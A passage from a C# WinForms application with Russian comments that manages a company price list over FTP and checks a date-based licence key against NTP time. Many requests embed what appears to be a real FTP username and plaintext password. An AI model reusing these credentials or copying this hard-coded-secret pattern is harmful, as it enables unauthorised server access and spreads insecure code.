                        List<string> files = new List<string>();
                        string fileList;
                        string[] fileName;
                        while (!streamReader.EndOfStream)
                        {
                            fileList = streamReader.ReadLine();
                            fileName = fileList.Split(' ');
                            if (fileName[0] == "-rw-r--r--")
                            {
                                int thk = 0;
                                for (int i = 0; i < fileName.Length; i++)
                                {
                                    var regex = new Regex(@"\b(?:[01][0-9]|2[0-3]):[0-5][0-9]\b");
                                    var matches = regex.Matches(fileName[i]).Cast<Match>().Select(x => x.Value);
                                    foreach (var match in matches)
                                    {
                                        i = fileName.Length;
                                    }
                                    thk++;
                                }

                                string namess = "";
                                for (int i = thk; i < fileName.Length; i++)
                                {
                                    namess = namess + fileName[i];
                                    if (i < fileName.Length - 1) { namess = namess + " "; }
                                }
                                список_файлов_в_папке.Add(namess);
                            }
                        }
                        try { ftpWebResponse.Close(); } catch { }
                        //папка есть но файлов нет
                        if (список_файлов_в_папке.Count > 0)
                        {
                            for (int i = 0; i < список_файлов_в_папке.Count; i++)
                            {
                                string url32 = url_praise + "/data_praise/шаблоны/" + список_файлов_в_папке[i];
                                FtpWebRequest requestDel = (FtpWebRequest)WebRequest.Create(url32);
                                requestDel.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                                requestDel.Method = WebRequestMethods.Ftp.DeleteFile;
                                FtpWebResponse responseDel = null;
                                try
                                {
                                    responseDel = (FtpWebResponse)requestDel.GetResponse();
                                    responseDel.Close();
                                }
                                catch { } // если catch .. значит файла нет. это 550 ошибка       
                                try { responseDel.Close(); } catch { }
                            }
                        }
                    }
                    catch
                    {
                        //папки нет!
                    }
                    //потом удаляем пустую папку! Если её нет ничего страшного
                    FtpWebRequest requestD = (FtpWebRequest)WebRequest.Create(url_praise + "/data_praise/шаблоны");
                    requestD.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                    requestD.Method = WebRequestMethods.Ftp.RemoveDirectory;
                    FtpWebResponse responseD = null;
                    try { responseD = (FtpWebResponse)requestD.GetResponse(); } catch { }
                    try { responseD.Close(); } catch { }
                    responseD = null;
                    //переименновываем папку историю в рабочую
                    FtpWebRequest client333 = (FtpWebRequest)FtpWebRequest.Create(url_praise + "/data_praise/шаблоны_history");
                    client333.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
                    client333.Method = WebRequestMethods.Ftp.Rename;
                    client333.RenameTo = "шаблоны";
                    try
                    {
                        FtpWebResponse response333 = (FtpWebResponse)client333.GetResponse(); // вот тут ошибку выдает
                        Stream ftpStream333 = response333.GetResponseStream();
                        response333.Close();
                    }
                    catch { }
                }
            }
            else
            {
                //Всё плохо, истории нет
                MessageBox.Show("Нет файлов истории, откатывать не до чего.! Всё! ", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            try { button_return_ftp_praise.Invoke((MethodInvoker)delegate { button_return_ftp_praise.Text = "Восстановить прайс"; }); } catch { }
            try { progressBar1.Invoke((MethodInvoker)delegate { progressBar1.Visible = false; }); } catch { }
            try { label_bite.Invoke((MethodInvoker)delegate { label_bite.Visible = false; }); } catch { }
            try { date_return_ftp_prase_potok.Abort(); } catch { }
        }
        //данные о файлах. Инфо?!?
        private void button6_Click_1(object sender, EventArgs e)
        {
            if (setting[6] != "true") { MessageBox.Show("Вы не можете пользоваться данной опцией.\nПерейдит в настройки и проидите\nаутентификация пользователя!"); return; }

            List<string> отчёт = new List<string>();
            string ftpUri = url_praise + "/data_praise/";
            string ftpFileName = "";
            var ftpWebRequest = (FtpWebRequest)WebRequest.Create(new Uri(ftpUri));
            ftpWebRequest.Method = WebRequestMethods.Ftp.ListDirectoryDetails;
            ftpWebRequest.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            FtpWebResponse ftpWebResponse = null;
            try {  ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse(); } catch { MessageBox.Show("Не смогла подключиться!", "Ошибка"); return; }
            Stream stream = ftpWebResponse.GetResponseStream();
            StreamReader streamReader = new StreamReader(stream);

            while ((ftpFileName = streamReader.ReadLine()) != null)
            {
                string df = ftpFileName.Split(new[] { ' ', '\t' }).Last();
                ftpWebRequest = (FtpWebRequest)FtpWebRequest.Create(new Uri(ftpUri + df));
                //проверка на папку
                bool faile= false;
                if (df.Contains("."))
                {
                    faile = true;                
                }
                
                if (df == "." || df == "..")
                { }
                else
                {
                    string date = "";
                    string mbb = "";
                    if (faile == true)
                    {
                     var дата_файла = FtpGetFileTimestamp(ftpUri + df, "dahmira1_admin", "zI2Hghfnslob");
                     date = дата_файла.ToString();
                     var kkk1 = FtpGetFileSize(ftpUri + df, "dahmira1_admin", "zI2Hghfnslob");
                     mbb = FormatBytes(kkk1);
                    }                   
                    string name = df;                  
                    отчёт.Add(name);
                    отчёт.Add(mbb);
                    отчёт.Add(date);
                }
            }

            Form окошко = new Form();
            окошко.StartPosition = FormStartPosition.CenterScreen;
            окошко.MaximumSize = new Size(365, 330);
            окошко.Size = new Size(365, 300);
            окошко.MaximizeBox = false;
            окошко.MinimizeBox = false;
            окошко.TopMost = true;
            окошко.Icon = new System.Drawing.Icon("rez\\icon.ico");
            окошко.Text = "на сайте:";
            DataGridView table = new DataGridView();
            table.Location = new System.Drawing.Point(0, 0);
            table.Size = new Size(350, 260);
            var column1 = new DataGridViewTextBoxColumn();
            var column2 = new DataGridViewTextBoxColumn();
            var column3 = new DataGridViewTextBoxColumn();
            column1.HeaderText = "Имя файла";
            column1.Name = "Column1";
            column1.Width = 120;
            column2.HeaderText = "Вес";
            column2.Name = "Column2";
            column2.Width = 80;
            column3.HeaderText = "Дата";
            column3.Name = "Column3";
            column3.Width = 130;
            table.AllowUserToAddRows = false;
            table.RowHeadersVisible = false;
            table.Columns.AddRange(new DataGridViewColumn[] { column1, column2, column3 });
            for (int i = 0; i < отчёт.Count; i++)
            {
                table.Rows.Add(отчёт[i], отчёт[i + 1], отчёт[i + 2]);
                i++;
                i++;
            }
            окошко.Controls.Add(table);
            окошко.Show();
        }
        // Используйте FTP для получения метки времени удаленного файла.
        private DateTime FtpGetFileTimestamp(string uri, string user_name, string password)
        {
            // Получить объект, используемый для связи с сервером.
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(uri);
            request.Method = WebRequestMethods.Ftp.GetDateTimestamp;
            // Получить сетевые учетные данные.
            request.Credentials =
                new NetworkCredential(user_name, password);
            try
            {
                using (FtpWebResponse response =
                    (FtpWebResponse)request.GetResponse())
                {
                    // Вернем размер.
                    return response.LastModified;
                }
            }
            catch (Exception ex)
            {
                // Если файл не существует, верните 1 января 3000.
                // Иначе удалите ошибку.
                if (ex.Message.Contains("File unavailable"))
                    return new DateTime(3000, 1, 1);
                 throw; 
            }
        }
        // Используйте FTP для получения размера удаленного файла.
        private long FtpGetFileSize(string uri, string user_name,
            string password)
        {
            // Получить объект, используемый для связи с сервером.
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(uri);
            request.Method = WebRequestMethods.Ftp.GetFileSize;

            // Получить сетевые учетные данные.
            request.Credentials =
                new NetworkCredential(user_name, password);

            try
            {
                using (FtpWebResponse response =
                    (FtpWebResponse)request.GetResponse())
                {
                    // Вернем размер.
                    return response.ContentLength;
                }
            }
            catch (Exception ex)
            {
                // Если файл не существует, верните -1.
                // Иначе удалите ошибку.
                if (ex.Message.Contains("File unavailable")) return -1;
                throw;
            }
        }
        // перевод веса в глаз приятное
        private static string FormatBytes(long bytes)
        {
            string[] Suffix = { "байт", "Kбайт", "Mбайт", "Gбайт", "Tбайт" };
            int i;
            double dblSByte = bytes;
            for (i = 0; i < Suffix.Length && bytes >= 1024; i++, bytes /= 1024)
            {
                dblSByte = bytes / 1024.0;
            }

            return String.Format("{0:0.##} {1}", dblSByte, Suffix[i]);
        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }



        #region автопроверка прайса на сайте. А есть ли и как оно там

        static System.Windows.Forms.Timer t;
       const  int INTERVAL = 60; //Минута

        //LOAD
        void nyna_proverca_praise_ftp()
        {          
                t = new System.Windows.Forms.Timer();
                t.Interval = 5000;
                t.Tick += new EventHandler(t_Tick);
                t.Start();            
        }
        Thread proverka_praisev_c_ftp_potok;    
        //loop
        public void t_Tick(object sender, EventArgs e)
        {
            int g = INTERVAL;
            if (g <= 0) g = 60;
            DateTime now = DateTime.Now;
            DateTime future = now.AddMinutes((g - (now.Minute % g))).AddSeconds(now.Second * -1).AddMilliseconds(now.Millisecond * -1);
            TimeSpan interval = future - now;
            t.Interval=(int)interval.TotalMilliseconds;
            proverka_praisev_c_ftp_potok = new Thread(proverka_praisev_c_ftp);
            proverka_praisev_c_ftp_potok.Start();
  
        }

        int CalculateTimerInterval(int minute)
        {
            if (minute <= 0)
                minute = 60;
            DateTime now = DateTime.Now;
            DateTime future = now.AddMinutes((minute - (now.Minute % minute))).AddSeconds(now.Second * -1).AddMilliseconds(now.Millisecond * -1);
            TimeSpan interval = future - now;
            return (int)interval.TotalMilliseconds;
        }


        //public static void proverka_praisev_c_ftp_STATIC()
        //{

        //    Form1.proverka_praisev_c_ftp();
        //}


        public void proverka_praisev_c_ftp()
        {


            //изменения в коэф цен



            FtpWebRequest requestу = (FtpWebRequest)WebRequest.Create(url_praise + "/coefficient_prices/coefficient_prices_test.txt");
            requestу.Method = WebRequestMethods.Ftp.DownloadFile;
            requestу.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            string[] messenges_baks = null;

            FtpWebRequest requestCountries = (FtpWebRequest)WebRequest.Create(url_praise + "/countries/countries.json");
            requestCountries.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            requestCountries.Method = WebRequestMethods.Ftp.DownloadFile;

            try
            {
                FtpWebResponse response2 = (FtpWebResponse)requestу.GetResponse();
                Stream responseStreamу = response2.GetResponseStream();
                StreamReader readerу = new StreamReader(responseStreamу);
                string s = readerу.ReadToEnd();
                messenges_baks = s.Split(
                 new[] { "\r\n", "\r", "\n" },
                   StringSplitOptions.None
                  );
                try { readerу.Close(); } catch { }
                try { response2.Close(); } catch { }

                if (messenges_baks == null)
                {
                    return;
                }

                //чтение json-файла с ftp сервера
                FtpWebResponse responseCountries = (FtpWebResponse)requestCountries.GetResponse();
                Stream responseCountriesFtp = responseCountries.GetResponseStream();
                StreamReader readerCountries = new StreamReader(responseCountriesFtp);



                string jsonFtpText = readerCountries.ReadToEnd(); //json с ftp сервера
                string jsonLocalString = ""; // json на пк
                
                try
                {
                    jsonLocalString = File.ReadAllText("countries.json");
                }
                catch
                {

                }

                bool ne_now = false;
                bool ne_now_countries = false;

                for (int i = 1; i < 46; i++)
                {
                    if (settlement_price[i] != messenges_baks[i])
                    {
                        ne_now = true;
                        ne_now_countries = true;
                        i = 47;
                    }
                }

                //MessageBox.Show("Тута\n" + jsonFtpText + "\n\n" + jsonLocalString, "Важное сообщение", MessageBoxButtons.OK, MessageBoxIcon.Information);

                if (!ne_now)
                {
                    if (jsonFtpText != jsonLocalString)
                    {
                        ne_now_countries = true;
                    }
                }
                
                


                if (ne_now || ne_now_countries)
                {


                    //есть изменения
                    comboBox_елупни.Items.Clear();
                    ////////////////
                    bool isDecimal = Decimal.TryParse(settlement_price[comboBox_елупни.SelectedIndex + 16], out koff_klienty);
                    label18.Text = koff_klienty.ToString();
                   try
                    {
                        messenges_baks[0] = "1";
                        FileStream fileStream = File.Open("settlement.dll", FileMode.Create);
                        // получаем поток
                        StreamWriter output = new StreamWriter(fileStream);
                        for (int x = 0; x < 46; x++)
                        {
                            if (x < 45) output.Write(messenges_baks[x] + "\n");
                            if (x == 45) output.Write(messenges_baks[x]);
                        }
                        // закрываем поток
                        output.Close();
                    }
                    catch { label_consol.Text = "Файл данных о коэффициентах для переноса цен поврежден!"; }


                    //теперь нужно подменить значения в программе 

                    settlement_price=messenges_baks;
                    for (int x = 1; x < 16; x++)
                    {
                        if (settlement_price[x] != "")
                        {
                            try { comboBox_елупни.Items.Add(settlement_price[x]); } catch { label_consol.Text = "Файл данных о коэффициентах для переноса цен поврежден!"; }
                        }
                    }
                    try
                    {
                        int d = Int16.Parse(settlement_price[0]);
                        comboBox_елупни.SelectedIndex = Int16.Parse(settlement_price[0]);
                        bool isDecimal222 = Decimal.TryParse(settlement_price[d + 16], out koff_klienty);
                        label18.Text = koff_klienty.ToString();
                    }
                    catch { label_consol.Text = "Файл данных о коэффициентах для переноса цен поврежден!"; }
                    MessageBox.Show("-----Внимание!-------\nРукаводство сменило коэф.цен для менеджеров!\nЯ сменила их у тебя!\nИ сбросила твой выбор позиции там!", "Важное сообщение", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }

                if (ne_now_countries)
                {
                    File.WriteAllText("countries.json", jsonFtpText);

                    try
                    {
                        Manager.Instance.countries = JsonConvert.DeserializeObject<List<Country>>(jsonFtpText);
                    }
                    catch
                    {
                    }

                    MessageBox.Show("-----Внимание!-------\nРукаводство сменило местных поставщиков!\nЯ сменила их у тебя!\nИ сбросила твой выбор позиции там!", "Важное сообщение", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch
            {
              
            }

            //конец изменения в коэф цен


            //1 прайс имеет отношение к сайту сравнив папку с адресом праса
            string set_time = DateTime.Now.Hour.ToString("00") + ":" + DateTime.Now.Minute.ToString("00") + ":" + DateTime.Now.Second.ToString("00")+" ";
            if (istohtik_bazi.Contains(setting[4])&& setting[6]=="true")
            {

            }
            else
            {
                try { label_info_ftp.Invoke((MethodInvoker)delegate { label_info_ftp.Text = set_time + "Это левый прайс"; label_info_ftp.BackColor = Color.LemonChiffon; }); } catch { }
                try { proverka_praisev_c_ftp_potok.Abort(); } catch { }// рубим поток! так как не авторизированнй пользователь и это левый сотрудник
            }

            //2 читаем наш прайс 

        


            string url = url_praise + "/data_praise/data.txt";
            string[] messenges = null;
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(url);
            request.Method = WebRequestMethods.Ftp.DownloadFile;
            request.Credentials = new NetworkCredential("dahmira1_admin", "zI2Hghfnslob");
            FtpWebResponse response = null;
            try { response = (FtpWebResponse)request.GetResponse(); } catch { try { label_info_ftp.Invoke((MethodInvoker)delegate { label_info_ftp.Text = set_time+"небыло интернета"; label_info_ftp.BackColor = Color.LemonChiffon; }); } catch { }        try { proverka_praisev_c_ftp_potok.Abort(); } catch { } }
            Stream responseStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(responseStream);
            messenges = reader.ReadToEnd().Split(
            new[] { "\r\n", "\r", "\n" },
              StringSplitOptions.None
             );
            reader.Close();
            response.Close();
            if (messenges.Length == 7)
            {
                //пробую почитать файл у себя 
                string my_baza_put = setting[4] + "\\data.txt";
                string[] my_baza_data = new string[14];
                try
                {
                    using (StreamReader stream = new StreamReader(my_baza_put))
                    {
                        int c = 0;
                        while (stream.Peek() >= 0)
                        {
                            my_baza_data[c] = stream.ReadLine();
                            c++;
                        }
                        stream.Close();
                    }
                }
                catch
                {
                }
              
                if (my_baza_data[0] == null)
                { //есть прайс в нете, нет файла на компе
                    //туту остановился надо составить сообщение. 
                   { try { label_info_ftp.Invoke((MethodInvoker)delegate { label_info_ftp.Text = set_time + "Это левый прайс! В сети: Автор: "+ messenges[6]+" от: "+ messenges[3] + "/" + messenges[4] + "/" + messenges[5]; }); label_info_ftp.BackColor = Color.Orange; } catch { } try { proverka_praisev_c_ftp_potok.Abort(); } catch { } } ///сюда воткнуть ниже текст
                }
                else
                {
                    //Сравним файлы
                    string vivod = "Не смогла сравнить файлы!";
                    try
                    {                       //new DateTime(2015, 7, 20, 18, 30, 25); // год - месяц - день - час - минута - секунда
                        DateTime ser = new DateTime(Convert.ToInt16(messenges[5]), Convert.ToInt16(messenges[4]), Convert.ToInt16(messenges[3]), Convert.ToInt16(messenges[0]), Convert.ToInt16(messenges[1]), Convert.ToInt16(messenges[2]));
                        DateTime my = new DateTime(Convert.ToInt16(my_baza_data[5]), Convert.ToInt16(my_baza_data[4]), Convert.ToInt16(my_baza_data[3]), Convert.ToInt16(my_baza_data[0]), Convert.ToInt16(my_baza_data[1]), Convert.ToInt16(my_baza_data[2]));
                        if (my < ser) { vivod = "Файл в интернете новее!"; }
                        if (my > ser) { vivod = "Файл в интернете старый!"; }
                        if (my == ser) { vivod = "Файлы одинаковые!"; }
                    }
                    catch {
                                   
                         try { label_info_ftp.Invoke((MethodInvoker)delegate { label_info_ftp.Text = set_time + "Данные о прайсе у тебя повреждены!, скачай заново"; label_info_ftp.BackColor = Color.LemonChiffon; }); } catch { }    try { proverka_praisev_c_ftp_potok.Abort(); } catch { } }
                    if (my_baza_data[7] == null)
                    {
                      try { label_info_ftp.Invoke((MethodInvoker)delegate { label_info_ftp.Text = set_time + vivod + " от: " + messenges[3] + "/" + messenges[4] + "/" + messenges[5]; }); } catch { }
                    }
                    else
                    {
                        if (vivod == "Файл в интернете новее!") { vivod = "Файл в интернете новее твоей измененной копии!"; }
                        if (vivod == "Файл в интернете старый!") { vivod = "Файл в интернете древнее твоей измененной копии!"; }
                        if (vivod == "Файлы одинаковые!") { vivod = "Файлы были одинаковые когда-то, ты что то сохранил!"; }
                        try {label_info_ftp.Invoke((MethodInvoker)delegate { label_info_ftp.Text = set_time + vivod + " в сети от: " + messenges[3] + "/" + messenges[4] + "/" + messenges[5]; }); } catch { }                     
                    }
                }
            }
            else
            {
                try { label_info_ftp.Invoke((MethodInvoker)delegate { label_info_ftp.Text = set_time + "Ошибки на сайте\nЗвони разработчику."; label_info_ftp.BackColor = Color.LemonChiffon; }); } catch { }             
            }                    
            try { proverka_praisev_c_ftp_potok.Abort(); } catch{  }// рубим поток!    
        }


        #endregion автопроверка прайса на сайте. А есть ли и как оно там


        //моя история на компе! 
        private void button8_Click(object sender, EventArgs e)
        {
            //моя история 
            try
            {
                string path = setting[4] + "\\My_history_work_" + setting[3] + ".txt";
                FileInfo fi1 = new FileInfo(path);
                string my_mess = "";
                using (StreamReader sr = fi1.OpenText())
                {
                    string s = "";
                    while ((s = sr.ReadLine()) != null)
                    {
                        my_mess = my_mess + s + "\n";
                    }
                }




                окошко = new Form();
                richTextBox1 = new RichTextBox();
                окошко.StartPosition = FormStartPosition.CenterScreen;
                окошко.Size = new Size(1000, 700);
                окошко.MinimumSize = new Size(200, 150);
                окошко.MaximizeBox = false;
                окошко.MinimizeBox = false;
                окошко.TopMost = true;
                окошко.Icon = new System.Drawing.Icon("rez\\icon.ico");
                окошко.Text = "My history work";
                richTextBox1.Location = new System.Drawing.Point(0, 0);
                richTextBox1.Size = new Size(983, 660);
                richTextBox1.Text = my_mess;
                окошко.SizeChanged += new EventHandler(Size_richTextBox1);
                окошко.Controls.Add(richTextBox1);
                окошко.Show();
            }
            catch { label_consol.Text = "Ты ничего не делал. Нечего показывать"; }
        }

         RichTextBox richTextBox1 = null;
         Form окошко = null;        
        private void Size_richTextBox1(object sender, EventArgs e)
        {
            richTextBox1.Size = new Size(окошко.Size.Width-17, окошко.Size.Height-40 );
        }
        


        #endregion работа с прайсом с сайта
        //Обновление настроек в программе 
        public void get_setting()
        {
            using (StreamReader stream = new StreamReader("theme.dll"))
            {
                int c = 0;
                while (stream.Peek() >= 0)
                {
                    setting[c] = stream.ReadLine();
                    c++;
                }
                stream.Close();
            }
        }
        //тема оформление программы 
        public void tema(int t)
        {
            switch (t)
            {
                case(0):
                    this.BackColor = Color.Empty;
                    menuStrip1.BackColor = Color.Empty;
                    break;
                case (1):
                    this.BackColor = Color.DarkGray;
                    tableBindingNavigator.BackColor = Color.DarkGray;
                    menuStrip1.BackColor = Color.SlateGray;
                    break;
                case (2):
                    this.BackColor = Color.Gainsboro;
                    tableBindingNavigator.BackColor = Color.Gainsboro;
                    menuStrip1.BackColor = Color.Beige;
                    break;
            }
        }

        //проверка ключа пользователя
        private bool proverka_key()
        {



            DateTime dateTimeStart = new DateTime(1900, 1, 1, 1, 0, 0, 0);
            DateTime dateTimeStop = new DateTime(1900, 1, 1, 1, 0, 0, 0);


            string codewhat = setting[7] ;
            try
            {
                byte[] bytes = new byte[codewhat.Length / 2];
                int g = 0;
                for (int i = 0; i < codewhat.Length; i = i + 2)
                {
                    bytes[g] = Convert.ToByte(codewhat.Substring(i, 2));
                    g++;
                }
                string str = Encoding.ASCII.GetString(bytes);
                int p5 = Convert.ToInt16(str.Substring(0, 2));
                int p4 = Convert.ToInt16(str.Substring(3, 2));
                int p3 = Convert.ToInt16(str.Substring(6, 2));
                int p2 = Convert.ToInt16(str.Substring(9, 2));
                int p1 = Convert.ToInt16(str.Substring(12, 4));        // год - месяц - день - час - минута - секунда
                dateTimeStart = new DateTime(p1, p2, p3, p5, p4, 00); // год - месяц - день - час - минута - секунда
                int f5 = Convert.ToInt16(str.Substring(17, 2));
                int f4 = Convert.ToInt16(str.Substring(20, 2));
                int f3 = Convert.ToInt16(str.Substring(23, 2));
                int f2 = Convert.ToInt16(str.Substring(26, 2));
                int f1 = Convert.ToInt16(str.Substring(29, 4));
                dateTimeStop = new DateTime(f1, f2, f3, f5, f4, 00);
                string dfd = "Расшифровка: \n c:" + dateTimeStart.ToString() + " по:" + dateTimeStop.ToString();
            }
            catch
            {
                MessageBox.Show("Ключ поврежден!", "Проверка доступа", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                return false;
            }



           //     MessageBox.Show(dfd);

                DateTime tec = new DateTime(1900, 1, 1, 1, 0, 0, 0);

            int hp = 0;
            bool new_t = false;
            while (new_t == false)
            {
                try
                {
                    tec = GetNetworkTimeUtc();
                    tec = tec.AddHours(+3);
                    new_t = true;
                 }
                catch
                {
                    hp++;                    
                }
                if (hp > 5)
                {
                    MessageBox.Show("Для сохранения данных требуется верификация в сети!\n Для этого нужен стабильный интернет!\nТребования компании.\n У тебя плохой!", "Проверка доступа", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                    new_t = true;
                }
            }

            if (hp > 5) { return false; }
         
                if (dateTimeStart < tec && dateTimeStop > tec)
                {
                return true;
                }

                if (dateTimeStop < tec)
                {
                    //закончился ключ 
                    //оповистить и 
                    MessageBox.Show("Ключ истёк:\n" + dateTimeStop.ToString(), "Проверка доступа", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                return false;
                }
            return false;
        }

        private void label_добавленно_Click(object sender, EventArgs e)
        {

        }

        private void скачатьССайтаПрайсToolStripMenuItem_Click(object sender, EventArgs e)
        {
            button5.PerformClick();
        }

        private void данныеОПрайсеНаСайтеToolStripMenuItem_Click(object sender, EventArgs e)
        {
            button_проверить_url_praise.PerformClick();
        }

        private void tableDataGridView_CellContentClick_1(object sender, DataGridViewCellEventArgs e)
        {

        }

        public static DateTime GetNetworkTimeUtc(string ntpServer = "132.163.97.3") //"time.nist.gov")
        {
            // NTP message size - 16 bytes of the digest (RFC 2030)
            var ntpData = new byte[48];

            //Setting the Leap Indicator, Version Number and Mode values
            ntpData[0] = 0x1B; //LI = 0 (no warning), VN = 3 (IPv4 only), Mode = 3 (Client Mode)

            var addresses = Dns.GetHostEntry(ntpServer).AddressList;

            // NTP работает через UDP и использует порт 123
            var ipEndPoint = new IPEndPoint(addresses[0], 123);
            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
            {
                socket.Connect(ipEndPoint);

                //Stops code hang if NTP is blocked
                socket.ReceiveTimeout = 3000;

                socket.Send(ntpData);
                socket.Receive(ntpData);
            }

            //Offset to get to the "Transmit Timestamp" field (time at which the reply 
            //departed the server for the client, in 64-bit timestamp format."
            const byte serverReplyTime = 40;

            // Get the seconds part
            ulong intPart = BitConverter.ToUInt32(ntpData, serverReplyTime);

            // Get the seconds fraction
            ulong fractPart = BitConverter.ToUInt32(ntpData, serverReplyTime + 4);

            //Convert From big-endian to little-endian
            intPart = SwapEndianness(intPart);
            fractPart = SwapEndianness(fractPart);

            var milliseconds = (intPart * 1000) + ((fractPart * 1000) / 0x100000000L);
            return (new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds((long)milliseconds);
        }
        static uint SwapEndianness(ulong x)
        {
            return (uint)(((x & 0x000000ff) << 24) +
                           ((x & 0x0000ff00) << 8) +
                           ((x & 0x00ff0000) >> 8) +
                           ((x & 0xff000000) >> 24));
        }
    }
}